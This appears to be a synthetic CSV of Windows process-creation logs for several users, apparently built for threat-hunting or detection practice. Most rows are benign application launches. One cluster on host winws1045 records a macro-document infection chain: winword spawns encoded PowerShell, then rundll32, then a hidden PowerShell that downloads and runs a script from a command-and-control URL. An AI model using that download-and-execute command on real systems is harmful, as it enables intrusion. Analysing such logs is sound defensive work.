Hostname,Username,ProcessName,ProcessID,ParentProcessName,ParentProcessID,CommandLine,EventTimestamp
winws1100,a.smith,explorer.exe,7040,services.exe,500,null,2025-09-15 08:47:12.456345 UTC
winws0140,a.smith,explorer.exe,6910,services.exe,500,null,2025-09-15 08:45:57.123012 UTC
winws0250,a.smith,explorer.exe,6870,services.exe,500,null,2025-09-15 08:45:33.456345 UTC
winws1096,a.smith,explorer.exe,6820,services.exe,500,null,2025-09-15 08:45:12.123012 UTC
winws0210,a.smith,explorer.exe,5770,services.exe,500,null,2025-09-15 08:35:33.789678 UTC
winws0126,a.smith,explorer.exe,6140,services.exe,500,null,2025-09-15 08:38:57.456345 UTC
winws1252,a.smith,explorer.exe,5540,services.exe,500,null,2025-09-15 08:33:30.123012 UTC
winws0144,a.smith,explorer.exe,7130,services.exe,500,null,2025-09-15 08:47:57.456345 UTC
winws1255,a.smith,msedge.exe,17301,explorer.exe,5630,null,2025-09-15 08:34:21.789678 UTC
winws0161,a.smith,msedge.exe,11701,explorer.exe,4390,null,2025-09-15 08:23:03.456345 UTC
winws1081,a.smith,msedge.exe,19001,explorer.exe,6000,null,2025-09-15 08:37:42.123012 UTC
winws1295,a.smith,msedge.exe,22301,explorer.exe,6730,null,2025-09-15 08:44:21.456345 UTC
winws0201,a.smith,msedge.exe,16701,explorer.exe,5490,null,2025-09-15 08:33:03.123012 UTC
winws0240,a.smith,msedge.exe,21701,explorer.exe,6590,null,2025-09-15 08:43:03.789678 UTC
winws1319,a.smith,msedge.exe,25301,explorer.exe,7390,null,2025-09-15 08:50:21.456345 UTC
winws1061,a.smith,msedge.exe,14001,explorer.exe,4900,null,2025-09-15 08:27:42.456345 UTC
winws1311,a.smith,msedge.exe,24301,explorer.exe,7170,null,2025-09-15 08:48:21.123012 UTC
winws1215,a.smith,msedge.exe,12301,explorer.exe,4530,null,2025-09-15 08:24:21.123012 UTC
winws1202,a.smith,msedge.exe,10701,explorer.exe,4160,null,2025-09-15 08:21:00.789678 UTC
winws1222,a.smith,svchost.exe,3200,services.exe,500,null,2025-09-15 08:26:00.123012 UTC
winws1318,a.smith,svchost.exe,10400,services.exe,500,null,2025-09-15 08:50:00.123012 UTC
winws1262,a.smith,svchost.exe,6200,services.exe,500,null,2025-09-15 08:36:00.789678 UTC
winws1242,a.smith,svchost.exe,4700,services.exe,500,null,2025-09-15 08:31:00.456345 UTC
winws1282,a.smith,svchost.exe,7700,services.exe,500,null,2025-09-15 08:41:00.123012 UTC
winws0220,a.smith,teams.exe,19201,explorer.exe,6040,null,2025-09-15 08:38:03.456345 UTC
winws0151,a.smith,teams.exe,10501,explorer.exe,4130,null,2025-09-15 08:20:33.789678 UTC
winws0111,a.smith,teams.exe,15901,explorer.exe,5310,null,2025-09-15 08:31:27.456345 UTC
winws1265,a.smith,teams.exe,18601,explorer.exe,5910,null,2025-09-15 08:36:51.456345 UTC
winws0131,a.smith,teams.exe,20901,explorer.exe,6410,null,2025-09-15 08:41:27.123012 UTC
winws0181,a.smith,teams.exe,14201,explorer.exe,4940,null,2025-09-15 08:28:03.789678 UTC
winws1225,a.smith,teams.exe,13601,explorer.exe,4810,null,2025-09-15 08:26:51.789678 UTC
winws0129,d.kim,chrome.exe,20401,explorer.exe,6300,null,2025-09-15 08:40:27.456345 UTC
winws0089,d.kim,chrome.exe,10401,explorer.exe,4070,null,2025-09-15 08:15:28.123789 UTC
winws1079,d.kim,chrome.exe,18501,explorer.exe,5890,null,2025-09-15 08:36:42.456345 UTC
winws1261,d.kim,chrome.exe,18101,explorer.exe,5800,null,2025-09-15 08:35:51.789678 UTC
winws1211,d.kim,chrome.exe,11801,explorer.exe,4420,null,2025-09-15 08:23:21.456345 UTC
winws0109,d.kim,chrome.exe,15401,explorer.exe,5200,null,2025-09-15 08:30:27.789678 UTC
winws1221,d.kim,chrome.exe,13101,explorer.exe,4700,null,2025-09-15 08:25:51.123012 UTC
winws1291,d.kim,chrome.exe,21801,explorer.exe,6620,null,2025-09-15 08:43:21.789678 UTC
winws1251,d.kim,chrome.exe,16801,explorer.exe,5520,null,2025-09-15 08:33:21.123012 UTC
winws1059,d.kim,chrome.exe,13501,explorer.exe,4790,null,2025-09-15 08:26:42.789678 UTC
winws1315,d.kim,chrome.exe,24801,explorer.exe,7280,null,2025-09-15 08:49:21.789678 UTC
winws1307,d.kim,chrome.exe,23801,explorer.exe,7060,null,2025-09-15 08:47:21.456345 UTC
winws1268,d.kim,explorer.exe,5980,services.exe,500,null,2025-09-15 08:37:30.789678 UTC
winws0243,d.kim,explorer.exe,6670,services.exe,500,null,2025-09-15 08:43:48.789678 UTC
winws1248,d.kim,explorer.exe,5430,services.exe,500,null,2025-09-15 08:32:30.456345 UTC
winws1102,d.kim,explorer.exe,7150,services.exe,500,null,2025-09-15 08:48:12.123012 UTC
winws0094,d.kim,explorer.exe,4380,services.exe,500,null,2025-09-15 08:22:57.789678 UTC
winws0194,d.kim,explorer.exe,5290,services.exe,500,null,2025-09-15 08:31:18.456345 UTC
winws1228,d.kim,explorer.exe,4880,services.exe,500,null,2025-09-15 08:27:30.123012 UTC
winws0254,d.kim,explorer.exe,6980,services.exe,500,null,2025-09-15 08:46:33.123012 UTC
winws1208,d.kim,explorer.exe,4330,services.exe,500,null,2025-09-15 08:22:30.789678 UTC
winws1288,d.kim,explorer.exe,6530,services.exe,500,null,2025-09-15 08:42:30.123012 UTC
winws0207,d.kim,explorer.exe,5660,services.exe,500,null,2025-09-15 08:34:33.123012 UTC
winws0269,d.kim,explorer.exe,7420,services.exe,500,null,2025-09-15 08:50:33.789678 UTC
winws0204,d.kim,explorer.exe,5570,services.exe,500,null,2025-09-15 08:33:48.123012 UTC
winws0167,d.kim,explorer.exe,4560,services.exe,500,null,2025-09-15 08:24:33.456345 UTC
winws0174,d.kim,explorer.exe,4740,services.exe,500,null,2025-09-15 08:26:18.123012 UTC
winws0187,d.kim,explorer.exe,5110,services.exe,500,null,2025-09-15 08:29:33.789678 UTC
winws1106,d.kim,explorer.exe,7370,services.exe,500,null,2025-09-15 08:50:12.456345 UTC
winws0267,d.kim,explorer.exe,7330,services.exe,500,null,2025-09-15 08:49:48.789678 UTC
winws1084,d.kim,explorer.exe,6160,services.exe,500,null,2025-09-15 08:39:12.123012 UTC
winws0114,d.kim,explorer.exe,5480,services.exe,500,null,2025-09-15 08:32:57.456345 UTC
winws1054,d.kim,explorer.exe,4510,services.exe,500,null,2025-09-15 08:24:12.123012 UTC
winws0246,d.kim,explorer.exe,6760,services.exe,500,null,2025-09-15 08:44:33.789678 UTC
winws0262,d.kim,explorer.exe,7200,services.exe,500,null,2025-09-15 08:48:33.456345 UTC
winws0259,d.kim,explorer.exe,7110,services.exe,500,null,2025-09-15 08:47:48.456345 UTC
winws0164,d.kim,explorer.exe,4470,services.exe,500,null,2025-09-15 08:23:48.456345 UTC
winws0124,d.kim,explorer.exe,6030,services.exe,500,null,2025-09-15 08:37:57.789678 UTC
winws1201,d.kim,explorer.exe,4150,services.exe,500,null,2025-09-15 08:20:51.789678 UTC
winws0213,d.kim,explorer.exe,5840,services.exe,500,null,2025-09-15 08:36:18.789678 UTC
winws0184,d.kim,explorer.exe,5020,services.exe,500,null,2025-09-15 08:28:48.789678 UTC
winws0104,d.kim,explorer.exe,4930,services.exe,500,null,2025-09-15 08:27:57.123012 UTC
winws0233,d.kim,explorer.exe,6390,services.exe,500,null,2025-09-15 08:41:18.123012 UTC
winws0134,d.kim,explorer.exe,6580,services.exe,500,null,2025-09-15 08:42:57.123012 UTC
winws0223,d.kim,explorer.exe,6120,services.exe,500,null,2025-09-15 08:38:48.456345 UTC
winws1074,d.kim,explorer.exe,5610,services.exe,500,null,2025-09-15 08:34:12.789678 UTC
winws1064,d.kim,explorer.exe,5060,services.exe,500,null,2025-09-15 08:29:12.456345 UTC
winws0226,d.kim,explorer.exe,6210,services.exe,500,null,2025-09-15 08:39:33.456345 UTC
winws1271,d.kim,msedge.exe,19301,explorer.exe,6070,null,2025-09-15 08:38:21.456345 UTC
winws0216,d.kim,msedge.exe,18701,explorer.exe,5930,null,2025-09-15 08:37:03.789678 UTC
winws1231,d.kim,msedge.exe,14301,explorer.exe,4970,null,2025-09-15 08:28:21.789678 UTC
winws1089,d.kim,msedge.exe,21001,explorer.exe,6440,null,2025-09-15 08:41:42.789678 UTC
winws0177,d.kim,msedge.exe,13701,explorer.exe,4830,null,2025-09-15 08:27:03.123012 UTC
winws1049,d.kim,msedge.exe,11001,explorer.exe,4240,null,2025-09-15 08:21:42.456345 UTC
winws1069,d.kim,msedge.exe,16001,explorer.exe,5340,null,2025-09-15 08:31:42.123012 UTC
winws1238,d.kim,svchost.exe,4400,services.exe,500,null,2025-09-15 08:30:00.789678 UTC
winws1218,d.kim,svchost.exe,2900,services.exe,500,null,2025-09-15 08:25:00.456345 UTC
winws1278,d.kim,svchost.exe,7400,services.exe,500,null,2025-09-15 08:40:00.456345 UTC
winws1306,d.kim,svchost.exe,9500,services.exe,500,null,2025-09-15 08:47:00.123012 UTC
winws1314,d.kim,svchost.exe,10100,services.exe,500,null,2025-09-15 08:49:00.456345 UTC
winws1258,d.kim,svchost.exe,5900,services.exe,500,null,2025-09-15 08:35:00.123012 UTC
winws1298,d.kim,svchost.exe,8900,services.exe,500,null,2025-09-15 08:45:00.789678 UTC
winws0119,d.kim,teams.exe,17901,explorer.exe,5750,null,2025-09-15 08:35:27.123012 UTC
winws1241,d.kim,teams.exe,15601,explorer.exe,5250,null,2025-09-15 08:30:51.456345 UTC
winws0157,d.kim,teams.exe,11201,explorer.exe,4280,null,2025-09-15 08:22:03.789678 UTC
winws0197,d.kim,teams.exe,16201,explorer.exe,5380,null,2025-09-15 08:32:03.456345 UTC
winws0236,d.kim,teams.exe,21201,explorer.exe,6480,null,2025-09-15 08:42:03.123012 UTC
winws1281,d.kim,teams.exe,20601,explorer.exe,6350,null,2025-09-15 08:40:51.123012 UTC
winws0154,d.kim,teams.exe,10801,explorer.exe,4190,null,2025-09-15 08:21:18.789678 UTC
winws0252,d.kim,teams.exe,23201,explorer.exe,6920,null,2025-09-15 08:46:03.789678 UTC
winws0099,d.kim,teams.exe,12901,explorer.exe,4650,null,2025-09-15 08:25:27.456345 UTC
winws0139,d.kim,teams.exe,22901,explorer.exe,6850,null,2025-09-15 08:45:27.789678 UTC
winws1301,j.doe,chrome.exe,23101,explorer.exe,6900,null,2025-09-15 08:45:51.456345 UTC
winws1293,j.doe,chrome.exe,22101,explorer.exe,6680,null,2025-09-15 08:43:51.123012 UTC
winws1243,j.doe,chrome.exe,15801,explorer.exe,5300,null,2025-09-15 08:31:21.789678 UTC
winws1253,j.doe,chrome.exe,17101,explorer.exe,5580,null,2025-09-15 08:33:51.456345 UTC
winws1055,j.doe,chrome.exe,12501,explorer.exe,4570,null,2025-09-15 08:24:42.456345 UTC
winws0012,j.doe,chrome.exe,10012,explorer.exe,4050,null,2025-09-15 08:05:10.123456 UTC
winws1075,j.doe,chrome.exe,17501,explorer.exe,5670,null,2025-09-15 08:34:42.123012 UTC
winws0105,j.doe,chrome.exe,14401,explorer.exe,4980,null,2025-09-15 08:28:27.456345 UTC
winws1309,j.doe,chrome.exe,24101,explorer.exe,7120,null,2025-09-15 08:47:51.789678 UTC
winws1317,j.doe,chrome.exe,25101,explorer.exe,7340,null,2025-09-15 08:49:51.123012 UTC
winws1103,j.doe,chrome.exe,24501,explorer.exe,7210,null,2025-09-15 08:48:42.456345 UTC
winws1095,j.doe,chrome.exe,22501,explorer.exe,6770,null,2025-09-15 08:44:42.789678 UTC
winws1283,j.doe,chrome.exe,20801,explorer.exe,6400,null,2025-09-15 08:41:21.456345 UTC
winws1099,j.doe,chrome.exe,23501,explorer.exe,6990,null,2025-09-15 08:46:42.123012 UTC
winws1213,j.doe,chrome.exe,12101,explorer.exe,4480,null,2025-09-15 08:23:51.789678 UTC
winws0125,j.doe,chrome.exe,19401,explorer.exe,6080,null,2025-09-15 08:38:27.123012 UTC
winws0269,j.doe,explorer.exe,7380,services.exe,500,null,2025-09-15 08:50:18.123012 UTC
winws0215,j.doe,explorer.exe,5900,services.exe,500,null,2025-09-15 08:36:48.123012 UTC
winws0206,j.doe,explorer.exe,5620,services.exe,500,null,2025-09-15 08:34:18.456345 UTC
winws0110,j.doe,explorer.exe,5260,services.exe,500,null,2025-09-15 08:30:57.123012 UTC
winws1203,j.doe,explorer.exe,4200,services.exe,500,null,2025-09-15 08:21:21.123012 UTC
winws0166,j.doe,explorer.exe,4520,services.exe,500,null,2025-09-15 08:24:18.789678 UTC
winws0130,j.doe,explorer.exe,6360,services.exe,500,null,2025-09-15 08:40:57.789678 UTC
winws0238,j.doe,explorer.exe,6540,services.exe,500,null,2025-09-15 08:42:33.456345 UTC
winws1300,j.doe,explorer.exe,6860,services.exe,500,null,2025-09-15 08:45:30.123012 UTC
winws0176,j.doe,explorer.exe,4800,services.exe,500,null,2025-09-15 08:26:48.456345 UTC
winws1050,j.doe,explorer.exe,4290,services.exe,500,null,2025-09-15 08:22:12.789678 UTC
winws0199,j.doe,explorer.exe,5440,services.exe,500,null,2025-09-15 08:32:33.789678 UTC
winws0120,j.doe,explorer.exe,5810,services.exe,500,null,2025-09-15 08:35:57.456345 UTC
winws0179,j.doe,explorer.exe,4890,services.exe,500,null,2025-09-15 08:27:33.456345 UTC
winws0218,j.doe,explorer.exe,5990,services.exe,500,null,2025-09-15 08:37:33.123012 UTC
winws0150,j.doe,explorer.exe,4120,services.exe,500,null,2025-09-15 08:20:30.456345 UTC
winws0235,j.doe,explorer.exe,6450,services.exe,500,null,2025-09-15 08:41:48.456345 UTC
winws1280,j.doe,explorer.exe,6310,services.exe,500,null,2025-09-15 08:40:30.789678 UTC
winws0159,j.doe,explorer.exe,4340,services.exe,500,null,2025-09-15 08:22:33.123012 UTC
winws1316,j.doe,explorer.exe,7300,services.exe,500,null,2025-09-15 08:49:30.789678 UTC
winws1080,j.doe,explorer.exe,5940,services.exe,500,null,2025-09-15 08:37:12.789678 UTC
winws1090,j.doe,explorer.exe,6490,services.exe,500,null,2025-09-15 08:42:12.123012 UTC
winws0225,j.doe,explorer.exe,6170,services.exe,500,null,2025-09-15 08:39:18.789678 UTC
winws1240,j.doe,explorer.exe,5210,services.exe,500,null,2025-09-15 08:30:30.123012 UTC
winws0186,j.doe,explorer.exe,5070,services.exe,500,null,2025-09-15 08:29:18.123012 UTC
winws0245,j.doe,explorer.exe,6720,services.exe,500,null,2025-09-15 08:44:18.123012 UTC
winws0100,j.doe,explorer.exe,4710,services.exe,500,null,2025-09-15 08:25:57.789678 UTC
winws0156,j.doe,explorer.exe,4250,services.exe,500,null,2025-09-15 08:21:48.123012 UTC
winws1060,j.doe,explorer.exe,4840,services.exe,500,null,2025-09-15 08:27:12.123012 UTC
winws0253,j.doe,explorer.exe,6940,services.exe,500,null,2025-09-15 08:46:18.456345 UTC
winws0196,j.doe,explorer.exe,5350,services.exe,500,null,2025-09-15 08:31:48.789678 UTC
winws1260,j.doe,explorer.exe,5760,services.exe,500,null,2025-09-15 08:35:30.456345 UTC
winws0261,j.doe,explorer.exe,7160,services.exe,500,null,2025-09-15 08:48:18.789678 UTC
winws1220,j.doe,explorer.exe,4660,services.exe,500,null,2025-09-15 08:25:30.789678 UTC
winws1263,j.doe,msedge.exe,18301,explorer.exe,5850,null,2025-09-15 08:36:21.123012 UTC
winws0264,j.doe,msedge.exe,24701,explorer.exe,7250,null,2025-09-15 08:49:03.789678 UTC
winws1065,j.doe,msedge.exe,15001,explorer.exe,5120,null,2025-09-15 08:29:42.789678 UTC
winws1085,j.doe,msedge.exe,20001,explorer.exe,6220,null,2025-09-15 08:39:42.456345 UTC
winws0209,j.doe,msedge.exe,17701,explorer.exe,5710,null,2025-09-15 08:35:03.456345 UTC
winws1223,j.doe,msedge.exe,13301,explorer.exe,4750,null,2025-09-15 08:26:21.456345 UTC
winws0256,j.doe,msedge.exe,23701,explorer.exe,7030,null,2025-09-15 08:47:03.456345 UTC
winws0248,j.doe,msedge.exe,22701,explorer.exe,6810,null,2025-09-15 08:45:03.123012 UTC
winws0169,j.doe,msedge.exe,12701,explorer.exe,4610,null,2025-09-15 08:25:03.789678 UTC
winws1210,j.doe,svchost.exe,2300,services.exe,500,null,2025-09-15 08:23:00.123012 UTC
winws1230,j.doe,svchost.exe,3800,services.exe,500,null,2025-09-15 08:28:00.456345 UTC
winws1250,j.doe,svchost.exe,5300,services.exe,500,null,2025-09-15 08:33:00.789678 UTC
winws1290,j.doe,svchost.exe,8300,services.exe,500,null,2025-09-15 08:43:00.456345 UTC
winws0090,j.doe,svchost.exe,1700,services.exe,500,null,2025-09-15 08:20:57.456345 UTC
winws1270,j.doe,svchost.exe,6800,services.exe,500,null,2025-09-15 08:38:00.123012 UTC
winws1233,j.doe,teams.exe,14601,explorer.exe,5030,null,2025-09-15 08:28:51.123012 UTC
winws0143,j.doe,teams.exe,23901,explorer.exe,7070,null,2025-09-15 08:47:27.123012 UTC
winws0189,j.doe,teams.exe,15201,explorer.exe,5160,null,2025-09-15 08:30:03.123012 UTC
winws0095,j.doe,teams.exe,11901,explorer.exe,4430,null,2025-09-15 08:23:27.123012 UTC
winws0228,j.doe,teams.exe,20201,explorer.exe,6260,null,2025-09-15 08:40:03.789678 UTC
winws0135,j.doe,teams.exe,21901,explorer.exe,6630,null,2025-09-15 08:43:27.456345 UTC
winws1273,j.doe,teams.exe,19601,explorer.exe,6130,null,2025-09-15 08:38:51.789678 UTC
winws0115,j.doe,teams.exe,16901,explorer.exe,5530,null,2025-09-15 08:33:27.789678 UTC
winws1045,m.chen,powershell.exe,6310,winword.exe,6200,powershell.exe -enc VwByAGkAdABlAC0ASABvAHMAdAAgACgAIgBpAG4AdgBpAG4AbgAZQByACAAcwBjAHIAaQBwAHQAIgApADsA,2025-09-15 08:07:35.121212 UTC
winws1045,m.chen,rundll32.exe,6400,powershell.exe,6310,"rundll32.exe C:\Users\m.chen\AppData\Local\Temp\update.dat,EntryPoint",2025-09-15 08:07:38.454545 UTC
winws1045,m.chen,powershell.exe,7100,rundll32.exe,6400,"powershell.exe -nop -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://c2-backup-server.org/beacon.ps1')""",2025-09-15 08:08:00.998877 UTC
winws1045,m.chen,outlook.exe,5150,explorer.exe,4100,null,2025-09-15 08:06:00.112233 UTC
winws1045,m.chen,winword.exe,6200,outlook.exe,5150,C:\Users\m.chen\Downloads\invoice-document-share.docm,2025-09-15 08:07:30.556677 UTC
winws1227,m.chen,chrome.exe,13801,explorer.exe,4860,null,2025-09-15 08:27:21.123012 UTC
winws0097,m.chen,chrome.exe,12401,explorer.exe,4540,null,2025-09-15 08:24:27.789678 UTC
winws1067,m.chen,chrome.exe,15501,explorer.exe,5230,null,2025-09-15 08:30:42.456345 UTC
winws0137,m.chen,chrome.exe,22401,explorer.exe,6740,null,2025-09-15 08:44:27.123012 UTC
winws1237,m.chen,chrome.exe,15101,explorer.exe,5140,null,2025-09-15 08:29:51.789678 UTC
winws1087,m.chen,chrome.exe,20501,explorer.exe,6330,null,2025-09-15 08:40:42.123012 UTC
winws1267,m.chen,chrome.exe,18801,explorer.exe,5960,null,2025-09-15 08:37:21.789678 UTC
winws1277,m.chen,chrome.exe,20101,explorer.exe,6240,null,2025-09-15 08:39:51.456345 UTC
winws0145,m.chen,chrome.exe,24401,explorer.exe,7180,null,2025-09-15 08:48:27.789678 UTC
winws0149,m.chen,chrome.exe,25401,explorer.exe,7400,null,2025-09-15 08:50:27.123012 UTC
winws0117,m.chen,chrome.exe,17401,explorer.exe,5640,null,2025-09-15 08:34:27.456345 UTC
winws0112,m.chen,explorer.exe,5370,services.exe,500,null,2025-09-15 08:31:57.789678 UTC
winws1244,m.chen,explorer.exe,5320,services.exe,500,null,2025-09-15 08:31:30.789678 UTC
winws0219,m.chen,explorer.exe,6010,services.exe,500,null,2025-09-15 08:37:48.789678 UTC
winws0122,m.chen,explorer.exe,5920,services.exe,500,null,2025-09-15 08:36:57.123012 UTC
winws1204,m.chen,explorer.exe,4220,services.exe,500,null,2025-09-15 08:21:30.123012 UTC
winws1224,m.chen,explorer.exe,4770,services.exe,500,null,2025-09-15 08:26:30.456345 UTC
winws0190,m.chen,explorer.exe,5180,services.exe,500,null,2025-09-15 08:30:18.789678 UTC
winws0148,m.chen,explorer.exe,7350,services.exe,500,null,2025-09-15 08:49:57.789678 UTC
winws0239,m.chen,explorer.exe,6560,services.exe,500,null,2025-09-15 08:42:48.123012 UTC
winws0203,m.chen,explorer.exe,5550,services.exe,500,null,2025-09-15 08:33:33.456345 UTC
winws0180,m.chen,explorer.exe,4910,services.exe,500,null,2025-09-15 08:27:48.123012 UTC
winws0209,m.chen,explorer.exe,5730,services.exe,500,null,2025-09-15 08:35:18.123012 UTC
winws1072,m.chen,explorer.exe,5500,services.exe,500,null,2025-09-15 08:33:12.123012 UTC
winws0132,m.chen,explorer.exe,6470,services.exe,500,null,2025-09-15 08:41:57.456345 UTC
winws0249,m.chen,explorer.exe,6830,services.exe,500,null,2025-09-15 08:45:18.789678 UTC
winws0153,m.chen,explorer.exe,4170,services.exe,500,null,2025-09-15 08:21:03.123012 UTC
winws0163,m.chen,explorer.exe,4450,services.exe,500,null,2025-09-15 08:23:33.789678 UTC
winws1052,m.chen,explorer.exe,4400,services.exe,500,null,2025-09-15 08:23:12.456345 UTC
winws0258,m.chen,explorer.exe,7090,services.exe,500,null,2025-09-15 08:47:33.789678 UTC
winws0200,m.chen,explorer.exe,5460,services.exe,500,null,2025-09-15 08:32:48.456345 UTC
winws0102,m.chen,explorer.exe,4820,services.exe,500,null,2025-09-15 08:26:57.456345 UTC
winws1284,m.chen,explorer.exe,6420,services.exe,500,null,2025-09-15 08:41:30.456345 UTC
winws1082,m.chen,explorer.exe,6050,services.exe,500,null,2025-09-15 08:38:12.456345 UTC
winws0170,m.chen,explorer.exe,4630,services.exe,500,null,2025-09-15 08:25:18.456345 UTC
winws0222,m.chen,explorer.exe,6100,services.exe,500,null,2025-09-15 08:38:33.789678 UTC
winws0092,m.chen,explorer.exe,4270,services.exe,500,null,2025-09-15 08:21:57.123012 UTC
winws0183,m.chen,explorer.exe,5000,services.exe,500,null,2025-09-15 08:28:33.123012 UTC
winws1092,m.chen,explorer.exe,6600,services.exe,500,null,2025-09-15 08:43:12.789678 UTC
winws0242,m.chen,explorer.exe,6650,services.exe,500,null,2025-09-15 08:43:33.123012 UTC
winws0229,m.chen,explorer.exe,6280,services.exe,500,null,2025-09-15 08:40:18.456345 UTC
winws1264,m.chen,explorer.exe,5870,services.exe,500,null,2025-09-15 08:36:30.123012 UTC
winws0160,m.chen,explorer.exe,4360,services.exe,500,null,2025-09-15 08:22:48.789678 UTC
winws1062,m.chen,explorer.exe,4950,services.exe,500,null,2025-09-15 08:28:12.789678 UTC
winws1045,m.chen,explorer.exe,4100,services.exe,500,null,2025-09-15 08:05:20.321456 UTC
winws0232,m.chen,msedge.exe,20701,explorer.exe,6370,null,2025-09-15 08:41:03.456345 UTC
winws1287,m.chen,msedge.exe,21301,explorer.exe,6510,null,2025-09-15 08:42:21.123012 UTC
winws1077,m.chen,msedge.exe,18001,explorer.exe,5780,null,2025-09-15 08:35:42.789678 UTC
winws1247,m.chen,msedge.exe,16301,explorer.exe,5410,null,2025-09-15 08:32:21.456345 UTC
